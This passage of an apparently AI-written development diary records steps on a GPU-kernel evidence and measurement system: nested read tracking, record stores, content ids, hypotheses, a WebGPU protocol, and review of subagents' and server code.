  verdict({rows: [{k: {t: missing('x')}}], predicate: (r) => !(r.k.t > 1), support: [valid]})
  → supported [[true, []]]
  ```

  The proxy recorded only own top-level reads (`k`). `isMissing(row.k)` is false for an object, so the missing
  `k.t` was invisible, and `!(NaN > 1)` made the row pass.
- Replaced the single proxy with `track(target, path, read)`:
  - It records dotted paths and wraps every plain object or array it returns. Values and class instances are
    returned as they are.
  - `missingOf` resolves each recorded path against the row.
  - The first version proxied the row itself. It failed the new frozen-row case (`pass: true, missing: []`): the
    proxy invariant forces `get` to return a frozen property's own value, so the nested object could not be
    wrapped.
  - The final version proxies an empty shell (`[]` or `Object.create(proto)`) and forwards `get`, `has`, `ownKeys`
    and `getOwnPropertyDescriptor` to the row. Every property is reported as configurable, except an array's
    `length`, which the shell owns.
- New test "reads are tracked through nested objects and arrays":
  - nested missing → `missing: ['k.t']`;
  - an array element → `row 0: missing reps.1`;
  - writes to a nested object throw;
  - a frozen nested missing → `missing: ['f.inner.x']`.
- Guide updates:
  - §29.3 pseudocode and the paragraph after it (read tracking at any depth, the shell);
  - Appendix B (the shipped signatures and additions);
  - Appendix C (styles location);
  - §32.1 token table (`#6e6e6e`, `#8f8f8f`, `--sel` .05/.09, `--on-accent`), plus a sentence pointing at
    `contrast.mjs` and `specimen.mjs`.
- The fork's diary got a Step 5 recording the fix.

### Why

- The verdict decides whether a claim is supported. A hole that turns missing data into support is the failure the
  whole evidence design exists to prevent (P-8 in the guide). Rows built by `ev` in Phase 4 will be nested
  (`r.k.time`), so the top-level-only tracking would have been reachable as soon as hypotheses ship.

### What worked

- After the fix: `pnpm --filter @kiln/evidence test` → `Tests 111 passed (111)`; `typecheck` clean. The probe now
  gives `open [ 'row 0: missing k.t' ]`.
- A frozen row with a frozen array, read through `JSON.stringify(r)`, `[...r.xs]` and `{...r}`, gives `supported`
  without an error: the shell's forwarding satisfies spread, iteration and serialisation.

### What didn't work

- The first `track` (proxy over the row, returning raw values for frozen properties) left frozen nested rows
  untracked; the test failed with `- "missing": ["f.inner.x"], "pass": null` / `+ "missing": [], "pass": true`.

### What I learned

- A Proxy's `get` invariant applies to the proxy's own target. With an empty shell as the target, nothing in the
  row's descriptors constrains what `get` returns. The cost is that `getOwnPropertyDescriptor` must report
  descriptors the shell can accept (configurable, except an array's `length`).

### What was tricky to build

- Getting spread right. `{...r}` calls `ownKeys`, then `[[GetOwnProperty]]` for enumerability, then `[[Get]]`. All
  three must be forwarded, or the spread silently drops keys and the read is never recorded.

### What warrants a second pair of eyes

- `track` still does not see reads made through a class instance's methods (a `Map` in a row, say). Rows are plain
  data by contract (§29.2), and `ev` will build them that way.

### What should be done in the future

- Phase 3 adds `"@kiln/evidence": "workspace:*"` to `packages/kiln` (fork diary Step 4 has the import notes).

### Code review instructions

- `packages/evidence/src/verdict.ts` (`track`, `missingOf`) and the new test in `test/verdict.test.ts`.
- `pnpm --filter @kiln/evidence test && pnpm --filter @kiln/evidence typecheck`.

### Technical details

- The descriptor rule in `track`:
  `isArr && prop === 'length' ? {...d, writable: true, configurable: false} : {...d, configurable: true}`.

## Step 7: Phase 3, part 1 — records, the store and the v2 policy inside Kiln

Phase 3 is split in three. This step covers the core, which I wrote myself because every other part depends on
its contracts:
- content ids;
- device evidence ids;
- the `kiln-measure/1` record builder;
- the record store;
- `decide.evidence` v2 and `pinned-partial`;
- the activation check;
- the wiring in `wb.js` and the agent.

Part 2 (the views: Perf, Knobs, Kernels, Devices and the new Evidence view) and part 3 (the multi-repetition
WebGPU protocol) go to two subagents, which start from this commit.

Measuring every preset on `sim:rtx5090` stores 29 records, all valid. On the following compile, 28 schedule forks
read `by evidence (confirms the model)`; W-21 keeps its own `ladder` policy. This is the core of the Phase 3
done-condition for W-05.

### Prompt Context

**User prompt (verbatim):** see Step 1.

**Assistant interpretation:** Implement guide §21–§28 inside Kiln: records instead of keep-best rows, decisions on
intervals, activation and staleness.

**Inferred user intent:** Kiln's decisions must rest on evidence that says what ran, where, how often, and whether
it is still the current code.

**Commit (code):** see the commit after this step ("KILN-001 Phase 3a: …").

### What I did

- `packages/kiln/package.json`: dependency `"@kiln/evidence": "workspace:*"`. Kiln's `.js` files import the `.ts`
  package directly; Node 26 strips the types, and esbuild bundles them (+24 KB).
- `std/records.js` (new):
  - `CODEGEN_VERSION = "kiln-codegen/1"`, `INPUT_SEED = 1`.
  - `sourceOf(kern, lang)`: CUDA, WGSL, or `printKernelBody(K)` for the simulator.
  - `specHash(spec)`.
  - `contentOf(kern, device)`, memoised per kernel object: the §22 material via `contentId`.
  - `activationOf(kern, {run, kernelPins})`. Requested is, in order: the kernel pin, else the knob pins that apply
    to the kernel's schedule fork, else that fork's decided row. The check compares knob values with
    `kern.map`.
  - `makeRecord(...)`, which turns a device result into a `kiln-measure/1` record:
    - errors, failed checks, failed activation and missing repetitions become validity reasons;
    - wall clock becomes a partial caveat;
    - simulator counts are recorded as derived.
  - `legacyRecord(row)` for `kiln-evidence/1`.
- `std/store.js` rewritten as `EvidenceStore` (`Store` is kept as an alias for scripts):
  - `add` validates and dedupes by id;
  - `record`, `observe(prog, device)`, `isStale`, `isDecisive`, `status`;
  - `statsFor(device, identity, knobs)` pools the samples of decisive records and summarises them;
  - `optionStats(fp, run)`, `list`, `best`, `forget`;
  - `toJSON` gives `kiln-evidence/2`; `import` accepts `/2` and `/1`;
  - `rowOf` names rows as `canonRow` does.
- `core/kiln.js`:
  - `decide.evidence(store, {minReps = 3, always})` per §26, with notes (`confirms the model`,
    `separated from the model's choice …`, `evidence within noise: best … overlaps …`).
  - `decide.pinned` returns `pinned-partial` with a note when some knobs are pinned and calls the next policy for
    the rest.
  - `fp.pinned` lists the pins that were honoured. `allPinned` now counts only honoured pins: a pin the fork had
    to ignore no longer makes the decision read "pinned".
  - Decisions carry `note`.
- `std/devices.js`:
  - every device has `evidenceId` and `fingerprint` (simulator `sim:<key>`; WebGPU and CUDA from their info after
    a probe);
  - `runKernel` returns one repetition: `samples: [median of launches]`, `raw: [launch times]`, `kind`, `reps: 1`;
  - `CudaDevice.adopt(info, host)` sets the identity, for a live probe or an imported results file.
- `std/tune.js`: `measureProgram(..., {run, kernelPins})` stores one record per kernel with its activation;
  `tune` decides under `device.evidenceId`.
- `apps/workbench/src/ui/wb.js`:
  - the store persists as `evidence2`, and a `kiln-evidence/1` `evidence` key is imported once as legacy;
  - the compile context uses `device.evidenceId`, and every compile calls `store.observe(prog, device)`;
  - the kernel-pin policy reports `by: "kernel-pin"`;
  - `measure` passes the run and the kernel pins; bundle import adopts the CUDA identity;
  - new getter `wb.evidenceId`.
- `agent.js`: `forks.get` reports per option `measured` (median), `ci` and `n`; `evidence.list` returns records
  (median, n, kind, status, reasons); `evidence.best` returns median and CI.
- `packages/kiln/test/evidence.mjs` (25 checks):
  - records validate; dedupe;
  - staleness both ways (newest record versus an observed compile) and the older codegen;
  - a forged id is refused;
  - `/2` round trip and `/1` legacy import;
  - the policy: defers, confirms, simulator override, `n < minReps`, separated switch, within-noise keeps the
    model, wall clock never decides;
  - `pinned-partial`; activation for a pin, a broken pin and a kernel pin.

### Why

- **Two ids per device.** `id` stays the UI and preset selection key (`.device("sim:h100")`, localStorage); records
  carry `evidenceId`. A WebGPU adapter's fingerprint is known only after a probe, and the selection must work
  before it.
- **Current content id.** A fork's unchosen options have not been compiled, so their content id cannot be known
  when the fork is decided. The store takes the content id from the last compile that produced that row
  (`observe`), else from the newest record of the row. A record from another code generator is stale either way.
  The guide's §22 assumed the content id is always known; this is the practical form.
- **Pooling.** Two decisive records of one option are independent runs, so their per-repetition samples are
  pooled before summarising. Repetitions remain the unit.

### What worked

- `node test/evidence.mjs` → `all evidence checks pass` (25).
- `pnpm test` → evidence 111 tests; Kiln `core, evidence, progs, stack1-3, tune` (7 passed); `notes`, `presets`
  (2 passed).
- `pnpm build` → `dist/index.html 1137 KB (bundle 1081 KB, …)`.
- The all-presets script (scratchpad `activation-all.mjs`) → `29 records, 0 invalid`;
  `{ 'evidence (confirms the model)': 28, ladder: 1 }`.
- `test/tune.mjs`: after tuning, `greedy with evidence: [ 'n23: by evidence', 'n28: by evidence' ] store rows 31`.

### What didn't work

- The first version of `activationOf` named the requested row with `knobs.canonical`
  (`BK=8,BM=32,BN=16,COARSEN=1,MAP=tiled,STAGE=none,TM=1,TN=1,TPB=0`) and the materialised one with `canonRow`
  (`MAP=tiled,BM=32,BN=16,BK=8`). The two looked different even when they matched. Both now use `canonRow`, and the
  policy's notes go through `store.rowOf`. Core cannot import `canonRow`, which belongs to the standard library.
- My first simulator-override test searched for an option that actually beats the model and found none for a
  256×256 linear layer, so the check was vacuous. It now inserts a synthetic simulated record at half the time.

### What I learned

- Fork options carry the full knob set (643 options for the 256×256 linear layer). A materialised kernel's `map`
  holds the same names, so the activation check compares values knob by knob, not row strings.

### What was tricky to build

- `decide.pinned` with partial pins must call `next()`, the rest of the chain, rather than return null. Otherwise
  the evidence and model policies would still decide, but the attribution would lose the fact that a pin narrowed
  the options (K-7).

### What warrants a second pair of eyes

- `allPinned` now requires the pins to be honoured. A preset whose pins are not offered at some fork used to read
  "pinned" there and now reads `model`/`evidence`, with the existing warning. No preset test changed.
- `EvidenceStore.observe` emits on a new content id, which bumps the `store` channel after compiles. Views
  subscribed to `store` re-render once more per compile.

### What should be done in the future

- Part 2 (views) and part 3 (WebGPU protocol), by subagents.
- The guide's §22 should state the "current content id" rule.

### Code review instructions

- Start with `packages/kiln/src/std/records.js` and `store.js`, then the `evidence` and `pinned` policies in
  `core/kiln.js` (`decide`).
- `cd packages/kiln && node test/evidence.mjs`.

### Technical details

- Policy order: `[pinned, evidence, model (costPrior), first]`, with the workbench's kernel-pin policy in front.
  The evidence policy's `next()` is the model. An option is usable when it is deterministic or has
  `n ≥ minReps = 3`.

## Step 8: Phase 4, part 1 — hypotheses and the evidence context in Kiln

The two Phase 3 subagents were working on the views and the WebGPU protocol, so I took the part of Phase 4 that
touches none of their files: `Project.hypothesis`, the evidence context `ev` (guide §29.2), and
`evaluateHypotheses`. The workbench integration (hypothesis cards in Notes and the Hypotheses view) needs `wb.js`
and the views and waits for part 2.

The worked example is the guide's own: on W-05's RMSNorm (1024 × 4096), "one row per block is at least twice as
fast as one element per thread". It is `open` before measuring, still `open` with one side measured, and
`supported` once both schedules are measured on the simulator. The ratio is 0.007: `MAP=row,TPB=1024,STAGE=all`
over `TPB=128`, a thread-per-row mapping that runs only 1024 threads. It is `unqualified` once a fresh invalid
record of a read option exists.

### Prompt Context

**User prompt (verbatim):** see Step 1.

**Assistant interpretation:** Continue with the next phase where it does not collide with the running subagents.

**Inferred user intent:** Steady progress through the guide's phases.

**Commit (code):** see the commit after this step ("KILN-001 Phase 4a: …").

### What I did

- `std/evidence-context.js` (new):
  - `evidenceContext({store, prog, device, target})` → `{ev, support}` with `ev.kernels`, `ev.options(kernel)`,
    `ev.ratio(kernel, {a, b})`, `ev.total`, `ev.records(filter)`;
  - `evaluateHypotheses(project, ctx)`;
  - the `Hypothesis` builder (`claim`, `predicts(rows, predicate)`, `alternatives`, `scope`).
- `std/index.js`: `Project.hypothesis(id, fn)`, which refuses ids other than letters, digits and hyphens, and
  duplicates; `std.EvidenceStore`; `std.evidence = {evidenceContext, evaluateHypotheses}`.
- `@kiln/evidence` `verdict`: an open row's reason now carries the missing Value's reason:
  `row 0: missing hi (no measurement of MAP=thread for k_rms_norm_reduce on sim:rtx5090)`. Two assertions in
  `verdict.test.ts` were updated to the new text; that is the intended behaviour change, not a test bent to the
  code.
- `packages/kiln/test/hypotheses.mjs`, 15 checks:
  - duplicate ids; open before measuring; a throwing predicate; rows that throw (an unknown kernel); one side
    measured; `ev.total`;
  - both sides measured → supported, heuristic, unpaired;
  - support recorded; provenance of `ev.kernels`; `ev.options` with `chosen`; `ev.records` read-only;
  - an invalid supporting record → unqualified.

### Why

- **Provenance follows §24.** The model's time is heuristic. A simulator's time is heuristic, because it comes from
  a timing model over simulated counts. A hardware median is derived. `combine` gives a ratio or a total the
  weakest class of its parts.
- **Support includes fresh invalid records.** The statistics use only decisive records. Without this rule, a
  hypothesis would keep reading `supported` from older valid records after the latest measurement of the same code
  failed its check. Stale records are left out of support: they describe other code.
- **`ratio` sides are knob filters.** `"MAP=thread"` matches every thread-mapped option. The fastest measured match
  is used, because the claim is about mappings, not one exact row. `canonRow` drops knobs at their off value, so
  the thread row prints as `TPB=128`.

### What worked

- `node test/hypotheses.mjs` → `all hypothesis checks pass` (15).
- `pnpm --filter @kiln/kiln test` → 8 passed; `pnpm --filter @kiln/evidence test` → 111 passed; typecheck clean.

### What didn't work

- The first run failed two checks with `FAIL before measuring: open (row 0: missing hi)`. The reason did not say
  which measurement was missing. This led to the `withReason` change in `verdict`. A second failure was my test
  expecting `MAP=row` to be named first; `ev.ratio` reports the first missing side, which is `a` (`MAP=thread`).

### What I learned

- A ratio of 0.007 on the simulator: the thread mapping of a 4096-wide row reduction runs one thread per row, so
  1024 threads cover the whole problem. The model and the simulator agree to within 0.1 µs on the chosen row
  (24.3 µs).

### What was tricky to build

- Pairing in `ev.ratio`. Records pair only through a shared `protocol.pairId` (Phase 6). The pooled samples of the
  two sides are then zipped per repetition with unique `rep` indices, so `pairedRatio` sees each repetition once.
  Nothing produces paired records yet, so this path is untested until Phase 6.

### What warrants a second pair of eyes

- The unpaired interval `[b.lo / a.hi, b.hi / a.lo]` is conservative: wider than a bootstrap of the ratio would
  give. It never claims separation that is not there, but it can leave a true claim open for longer.

### What should be done in the future

- Workbench integration once part 2 lands:
  - `wb.hypotheses` recomputed on compile, store and device changes;
  - the Hypotheses view;
  - ```` ```hypothesis id ```` cards in notes;
  - `lab:hypothesis?id=`;
  - hypotheses in W-05, W-19 and W-25.

### Code review instructions

- `packages/kiln/src/std/evidence-context.js`, then `node packages/kiln/test/hypotheses.mjs`.

### Technical details

- `evaluateHypotheses` result:
  `{id, claim, alternatives, scope, verdict, reasons, checks, rows, support: [record ids], basis: simulated |
  measured | mixed | none, error}`.

## Step 9: Phase 4, part 2 — preset hypotheses, and two defects they exposed

With the three subagents still running (views, WebGPU protocol, server), I wrote the hypotheses for the three
presets the guide names (W-05, W-19, W-25), using only preset files and `packages/kiln` code no subagent owns. To
check them before any view can show them, I drove each preset headlessly: run the script, compile on
`sim:rtx5090`, measure, evaluate. That exposed a Phase 3a regression in W-25, and a defect in content identity that
made two of W-19's eleven unfused kernels permanently read "no measurement" after being measured.

The fix for the second is a rule change: a kernel's name is no longer part of its content id. Both are fixed,
with tests, and the guide's §22 now states the rule.

### Prompt Context

**User prompt (verbatim):** see Step 1.

**Assistant interpretation:** Continue Phase 4 where it does not collide with the running subagents.

**Inferred user intent:** Steady progress through the phases, with defects found and fixed as they appear.

**Commit (code):** see the commit after this step ("KILN-001 Phase 4b: …").

### What I did

- Presets:
  - **W-05** `row-beats-thread`: the guide's worked example, `ev.ratio("k_rms_norm_reduce", {a: "MAP=thread", b: "MAP=row"})`, `r.hi < 0.5`.
  - **W-19** `model-tracks-elementwise`: every kernel's measured time within 25 % of the model's
    (`Math.abs(r.time / r.model - 1) <= 0.25` over `ev.kernels()`), fused or not.
  - **W-25** `model-ranks-schedules` (Spearman ρ ≥ 0.9) and `model-pick-near-best` (regret ≤ 1.1). Both read one row
    computed from `ev.options("k_softmax_reduce")`. With fewer than three options measured, the row's fields are
    missing Values with the reason `1 schedule measured on this device: sweep them all`.
- `std.evidence` now also exports `missing`, `derived`, `heuristic`, `observed`, `combine`, `isMissing`, so a
  script can compute its own rows with provenance and reasons.
- W-25's check rewritten on records (`store.statsFor` per fork option), and its `spearman` replaced (see below).
- Content identity (see What didn't work):
  - `@kiln/evidence` `canonicalSource(text, symbol)` replaces the kernel's entry symbol, whole words only, with
    `kernel`; `ContentIdInput.sourceSha256` is the hash of that text.
  - `records.js`: `symbolOf(kern)` (as `emit.js`'s `cname` prints it); `contentOf` hashes the canonical source.
  - `program.js`: `seedOf` hashes `kern.identity` instead of `kern.name`.
  - Guide §22: pseudocode and a paragraph on the rule.
  - Told the server subagent (it recomputes content ids from job sources) to apply `canonicalSource`.
- Tests:
  - `identity.test.ts`: whole-word replacement, two names hash alike, a non-identifier symbol is refused
    (114 tests now).
  - `packages/kiln/test/evidence.mjs`: a program with `gelu(x)` and `gelu(y)` on equal shapes gives two kernels
    with one identity and one content id, one record, decisive for both.
- Probe script (scratchpad `presets-probe.mjs <preset> [--params JSON] [--measure-params JSON] [--sweep]`).

### Why

- **Hypotheses in presets are the done-condition of Phase 4**, and the presets test only compiles them. A headless
  evaluation is the only check of their predicates until the Hypotheses view exists.
- **The kernel name is not behaviour.** The CUDA emitter prints the name as the `__global__` symbol, and `seedOf`
  derived the input data from the name. So two kernels that compute the same thing on the same shapes were two
  "different executables". The store keys its current content id by (device, identity, row), which assumes one
  content id per key. Making the content id name-independent restores that assumption rather than complicating the
  store with sets of current ids.

### What worked

- Headless verdicts on `sim:rtx5090` after the fixes:

  ```text
  W-05  before measuring            open       row 0: missing hi (no measurement of MAP=thread for k_rms_norm_reduce on sim:rtx5090)
  W-05  MAP=thread also measured    supported  ratio 0.0075 (MAP=row,TPB=1024,STAGE=all / TPB=128), heuristic
  W-19  fused (1 kernel)            supported  model 30.92 µs, simulated 30.92 µs
  W-19  unfused (11 kernels)        supported
  W-25  one option measured         open       row 0: missing rho (1 schedule measured on this device: sweep them all)
  W-25  all 27 swept                ρ supported (0.9888), regret refuted (1.194)
  W-25 check after the sweep        27 of 27 … ρ = 0.989 … regret 1.19×
  ```

- W-25's refuted regret is the notes' own finding: the model's favourite `MAP=row,TPB=1024` simulates at 99.5 µs,
  the best `MAP=row,TPB=1024,STAGE=reused` at 83.3 µs. The notes argue that the model is probably closer to a real
  GPU here, so the same hypothesis on WebGPU is the natural next test.
- `pnpm test`: Kiln 9 passed (with the subagent's `protocol.mjs`), evidence 114, workbench `notes`, `presets`.

### What didn't work

- **W-25's check threw after a sweep:** `check threw Cannot read properties of undefined (reading 'MAP')`. It read
  the old evidence rows (`r.knobs`, `r.us`, `r.ok`) from `store.list`, which returns records since Phase 3a. The
  presets test missed it because with one option measured the check returns early. This was my regression in Step 7.
- **W-19 unfused: two kernels "unmeasured" after measuring.** `k_gelu_3` and `k_gelu_8` have the same identity
  (`28dyoaxxwi5`) and the same sim source hash (`ee2fb693b3fb`), but different content ids (`0b86204f9482`,
  `09f4be5c765c`), because the input seeds came from the names. `measureProgram` measures each (identity, row) once,
  so one record was stored, under `k_gelu_3`'s content id. Then `observe` set the current content id to
  `k_gelu_8`'s, the last one compiled, and the record read `stale`. Both rows showed
  `missing time (no measurement of k_gelu_3 TPB=128 on sim:rtx5090)`.
- **W-25's ρ differed between the check and the hypothesis** (0.984 vs 0.993) on the same 27 measurements. The old
  `rank` gave tied values consecutive ranks in input order, and the two callers list options in different orders;
  the thread-per-element schedules tie in the model. Replaced with Pearson's correlation of average ranks, which is
  Spearman's ρ with ties and does not depend on order: both now give 0.989.
- My first Python edit of W-25 cut the old `spearman` at the wrong `};` and left its tail behind (`Unexpected token`
  at line 31); an `Edit` was refused with `File has not been read yet`; removed the tail with a second exact
  replacement.

### What I learned

- One "current content id per key" is only sound if the key determines the executable. Anything in the content id
  that the key does not determine (here, the name through the symbol and the seeds) breaks staleness for programs
  that repeat a computation.
- Spearman's shortcut formula `1 − 6Σd²/(n(n²−1))` is exact only without ties.

### What was tricky to build

- Committing around the subagents: `records.js` also holds the WebGPU subagent's uncommitted edits (`repErrors`,
  `result.seed`, `result.partial`). I staged only my four hunks: `git diff` → filter the hunks in Python →
  `git apply --cached --recount`.

### What warrants a second pair of eyes

- `seedOf` changed for every kernel, so every content id changed: all records in a browser's `evidence2` store
  become stale after this commit (shown, not used). Acceptable before any release; after one, a change like this
  should bump `CODEGEN_VERSION` as well, so the reason is visible.
- `canonicalSource` replaces whole-word occurrences of the symbol anywhere in the text, comments included. Emitted
  code uses the name only as the entry symbol.

### What should be done in the future

- Phase 4 UI, after the views subagent: `wb.hypotheses`, the Hypotheses view, ```` ```hypothesis id ```` cards in
  W-05/W-19/W-25 notes, `lab:hypothesis?id=`, and a "pin `MAP=thread` and measure" link in W-05's notes.
- Exclude time-like fields (`us`) from a simulator record's `counts`, which are labelled derived; the simulator's
  time is heuristic (guide §24). Left until the WebGPU subagent has finished with `records.js`.

### Code review instructions

- `packages/evidence/src/identity.ts` (`canonicalSource`), `packages/kiln/src/std/records.js` (`symbolOf`,
  `contentOf`), `program.js` (`seedOf`), then the three presets.
- `cd packages/kiln && node test/evidence.mjs`; the probe: `node <scratchpad>/presets-probe.mjs
  ../../apps/workbench/presets/W-25-model-vs-measurement.js --sweep`.

### Technical details

- W-25's row function: `opts = ev.options(kernel)`; model favourite = lowest model time with the compile's
  tie-break (`k.knobs.canonical`); `rho` heuristic (it involves the model); `regret` takes the class of the times
  (`combine`), heuristic on the simulator, derived on hardware.

## Step 10: Phase 3, parts 2 and 3 — review and commit the views and the WebGPU protocol

Both Phase 3 subagents finished; their diaries are [03-phase3-views-diary.md](03-phase3-views-diary.md) (Steps 1–4)
and [04-phase3-webgpu-diary.md](04-phase3-webgpu-diary.md) (Steps 1–6). This step is my review of both, the fixes I
made in review, and the commit.

- **Views:** Perf, Knobs, Kernels and Devices read records and show the model, simulated and measured columns with
  provenance marks. A new Evidence view lists records with their validity, activation and check.
- **WebGPU protocol:** 7 repetitions × 20 launches, 3 warm-up, seeded order, one fresh GPUDevice per kernel per
  repetition. It runs on this Mac's Apple M1 Pro in headless Chrome.

Review produced six small changes, among them the follow-ups the WebGPU subagent left in files it did not own. One
of them, a NaN on Metal, is a code-generator change and bumps `CODEGEN_VERSION` to `kiln-codegen/2`.

### Prompt Context

**User prompt (verbatim):** see Step 1.

**Assistant interpretation:** Review the subagents' work, fix what is wrong, commit Phase 3.

**Inferred user intent:** Measurements the views can be trusted to present, from a protocol that gives real
intervals on real hardware.

**Commit (code):** see the commit after this step ("KILN-001 Phase 3b/3c: …").

### What I did

- Read the views diff (`marks.jsx`, `Evidence.jsx`, `Perf.jsx`, `Knobs.jsx`, `Kernels.jsx`, `wb.js`, `dock.js`,
  `App.jsx`, `agent.js`) and the protocol diff (`devices.js`, `tune.js`, three lines of `records.js`), and looked at
  the screenshots.
- Fixes in review:
  1. `Perf.jsx`: the total's stamp is solid when it is a hardware total. Dashed means "not hardware evidence"
     (§32.4), and "measured on WebGPU apple metal-3" was drawn dashed.
  2. `marks.jsx`: dropped its private `median` for `@kiln/kiln/core/util.js`'s, which `agent.js` already uses.
  3. `records.js`: a simulator record's `counts` (labelled derived) no longer contain the time model's outputs
     `us`, `min`, `gflops`, `gbs`. The simulated time is heuristic and already is the record's sample (§24).
  4. `wb.js`: a device with a protocol reports progress per step (`onStep(done, total)`, repetitions × kernels).
     Previously `onKernel` fired only after the whole batch, so the counter jumped from 0 to N.
  5. `devices.js`: `timerNote` is set when the run's timestamps sit on a grid of 1 µs or more, and `describe()`
     shows it in Devices, with the Chrome flag that removes it.
  6. `scripts/shoot.mjs`: on websocket close, pending DevTools calls reject ("the browser closed the DevTools
     connection") instead of never settling. A Chrome killed by the timeout used to end in
     `unsettled top-level await`.
- W-24 NaN on Metal: `fns.js` WGSL `tanh(clamp(x, -15.0, 15.0))`; `CODEGEN_VERSION = "kiln-codegen/2"`.
- Guide §28: an "as built" list (fresh adapter per context, inputs once per call, `position`, 60 s deadline,
  quantised timestamps marked partial, the M1 Pro clock levels).

### Why

- **The tanh clamp.** Metal evaluates WGSL `tanh` through exponentials, which overflow to `inf/inf` = NaN for
  |x| ≳ 44. W-24's GELU feeds it about 440. Since `tanh(15)` rounds to 1 in f32, clamping at ±15 changes no
  result anywhere. The CUDA path (`tanhf`) was unaffected.
- **The codegen bump.** The content id of every kernel that uses `tanh` changes by itself, but rows not compiled
  since would keep deciding from records of the NaN-producing code (§22, "the current content id of an option").
  Bumping `CODEGEN_VERSION` makes every older record stale at once.

### What worked

- `pnpm test`: evidence 114, Kiln 9 (with `protocol.mjs`, 38 checks), server 51, workbench 2. `pnpm build`:
  1194 KB. `node scripts/contrast.mjs`: all pairs pass.
- `pnpm --filter @kiln/workbench test:webgpu`: `all webgpu checks pass in 2.5 s`. W-10's three kernels are
  measured 7 times each, each repetition gives every kernel a distinct position, and the next compile decides all
  three forks `by evidence (confirms the model)`.
- W-24 on WebGPU (`webgpu:webgpu-apple-metal-3-2167faf0`), headless:

  ```text
  k_rms_norm_reduce      29.7 µs   check ok, max abs diff 1.19e-7   fresh
  k_linear_gelu_reduce 1020.2 µs   check ok, max abs diff 1.72e-5   fresh   (was NaN at 59 of 384 samples)
  k_linear_ew_reduce   1337.0 µs   check ok, max abs diff 6.48e-5   fresh
  ```

- `shoot.mjs` after its change: a normal run still writes its PNG.

### What didn't work

- Nothing failed in review. The WebGPU run showed the clock-level noise the subagent described:
  `k_matmul_reduce_2` samples `289 95.8 95.8 290 122 156 122`, interval [95.8, 289]. That is the GPU's behaviour,
  not a protocol defect.

### What I learned

- The M1 Pro's discrete clock levels make separately run measurements of one kernel differ by up to 3×. Unpaired
  comparisons on such a device need either the paired protocol or a reference kernel in every repetition.

### What was tricky to build

- Ordering the commits: the views use the protocol's `device.protocol`, and the server's tests compare its
  repetition order with the WebGPU code. So Phase 3 (views and protocol) is committed before the server, and the
  server, which touches neither, follows.

### What warrants a second pair of eyes

- `kiln-codegen/2` makes every stored record stale, including simulator records whose code did not change.
  Re-measuring is cheap on the simulator.
- `withoutTime` drops `us`, `min`, `gflops`, `gbs` from simulator counts, but `dram` stays. Its L2-hit fraction
  (0.12 or 0.6) is a heuristic inside an otherwise counted quantity, which the Roofline uses for intensity.

### What should be done in the future

- Phase 4 UI (Hypotheses view, notes cards, `lab:hypothesis`), then the page integration of the server.
- Tune's search chart has no intervals: `tune()` returns one total per program.
- Forget a single kernel or group from the Evidence view (the store supports it).

### Code review instructions

- Views: `apps/workbench/src/ui/marks.jsx` first (every value cell is built there), then `Evidence.jsx`, `Perf.jsx`.
- Protocol: `runProtocol`, `timerQuantum`, `WebGpuDevice.measureKernels` in `packages/kiln/src/std/devices.js`;
  `node packages/kiln/test/protocol.mjs`; `pnpm --filter @kiln/workbench test:webgpu` (needs Chrome and a GPU).

### Technical details

- Screenshots from the subagents: `various/screens/p3-*.png` (Evidence light/dark/phone/WebGPU, Perf sim/WebGPU,
  Knobs, Devices, default, phone dark, graph) and `p3-webgpu-W-05-perf-1600.png`, `p3-webgpu-W-10-perf-1600.png`.

## Step 11: Phase 5, part 1 — review and commit the server core; one copy of the protocol rules

The Phase 5 worker built `apps/server` (Hono, `node:sqlite`, server-sent events, CUDA executors), the runner's
stdin/stdout mode and a page-side client, and kept its own diary (`reference/05-phase5-server-diary.md`). I
reviewed it against guide §30 and committed it. The page does not use the server yet: wiring `wb.js`, the Jobs view
and a CUDA device per executor are the second part.

Before committing I removed the one structural defect the review found. Two protocol rules existed twice:
`repetitionOrder` (in Kiln's `devices.js` and the server's `protocol.ts`, held equal by a test) and the output check
(Kiln's `checkValues` and the server's `checkOutputs`, same tolerances and NaN handling, also held equal by a test).
Both now live once in `@kiln/evidence` (`src/protocol.ts`), and the browser and the server import them.

### Prompt Context

**User prompt (verbatim):** see Step 1 (the "Once upload, then implement it…" request).

**Assistant interpretation:** Review the Phase 5 worker's server before committing it, remove duplicated rules, and
record the review.

**Inferred user intent:** A server whose records and checks agree with the page's by construction, not by a test
that compares two copies.

**Commit (code):** recorded in the changelog entry for this step.

### What I did

- Read `S/src/security.ts`, `app.ts`, `jobs.ts`, `records.ts`, `devices.ts`, `executors/cuda-runner.ts`, the runner
  diff and the server diary's deviations list.
- Added `packages/evidence/src/protocol.ts` with `repetitionOrder(n, seed, rep)` and
  `checkSamples(got, want, {rtol, atol})` (exported with the `SampleCheck` type).
- `checkSamples` treats a `null` reference (the JSON spelling the server receives) exactly like `NaN` (what the page
  computes), and reports the index of the first failure in the caller's indexing.
- Kiln: deleted `checkValues` from `program.js`; `program.js` and `devices.js` call `checkSamples`. `devices.js`
  imports `repetitionOrder` and re-exports it, because `apps/workbench/test/webgpu.mjs` and
  `packages/kiln/test/protocol.mjs` import it from there.
- Server: deleted `S/src/protocol.ts`; `jobs.ts` imports both rules from `@kiln/evidence`. Removed the two
  "equal to the page" tests from `S/test/jobs.test.ts`: with one implementation there is nothing to compare.
- Added `packages/evidence/test/protocol.test.ts` (5 tests): permutation and determinism, golden orders for seed 1,
  float32 tolerance, `null` ≡ `NaN` skipping, a NaN output and a size mismatch failing.

### Why

- Two copies held equal by a test is one rule with two chances to drift, and the test only covers the inputs it
  lists. The order decides every record's `position` and the check decides `valid`, so a drift would make CUDA and
  WebGPU records of the same protocol disagree silently.
- `@kiln/evidence` is the package both sides already depend on for the record format, so the rules sit next to the
  records they produce.
- The golden orders (`02341 23401 03412 43102` for `n=5, seed=1`) pin the function: records already carry positions
  computed by it, so changing it requires a protocol bump, not an edited test.

### What worked

- `pnpm test`: evidence 119 (114 + 5), Kiln 9, server 49 (51 − the 2 comparison tests), workbench 2.
- `pnpm --filter @kiln/evidence typecheck`, `pnpm --filter @kiln/server typecheck`: clean.
- `pnpm build`: `dist/index.html 1195 KB (bundle 1136 KB, 25 presets, 25 with notes)`.

### What didn't work

- Nothing failed. The first version of the golden-order test used `toMatchSnapshot`, which hides the values in a
  separate file; I replaced it with literal values in the test.

### What I learned

- The old Kiln `checkValues` reported the first failure's index into the compacted array (NaN references removed),
  the server's into the original. `checkSamples` uses the original indexing, which is the one a reader can look up.

### What was tricky to build

- Keeping `repetitionOrder` importable from `@kiln/kiln/std/devices.js`: the workbench package does not depend on
  `@kiln/evidence`, so its WebGPU test reaches the function through Kiln.

